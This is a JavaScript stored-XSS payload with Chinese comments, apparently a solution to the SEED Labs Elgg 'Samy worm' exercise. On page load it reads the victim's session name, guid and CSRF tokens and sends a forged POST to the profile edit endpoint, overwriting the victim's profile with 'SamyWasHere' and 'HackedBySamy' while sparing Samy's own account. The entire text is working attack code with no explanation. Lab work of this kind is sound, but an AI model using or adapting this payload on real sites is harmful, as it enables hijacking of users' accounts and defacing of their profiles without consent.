<script type="text/javascript">
window.onload = function() {
    // 获取必要参数
    var name = "name=" + elgg.session.user.name;
    var guid = "guid=" + elgg.session.user.guid;
    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;

    // 构造要注入的内容（payload）
    var content = token + ts 
                + "&name=SamyWasHere" 
                + "&description=HackedBySamy"
                + "&briefdescription=YouGotOwned"
                + "&accesslevel[description]=2";

    // 不要攻击 Samy 自己
    var samyGuid = "59";
    var sendurl = "http://www.seed-server.com/action/profile/edit";

    if (elgg.session.user.guid != samyGuid) {
        // 创建并发送 Ajax 请求
        var Ajax = null;
        Ajax = new XMLHttpRequest();
        Ajax.open("POST", sendurl, true);
        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax.send(content);
    }
};
</script>
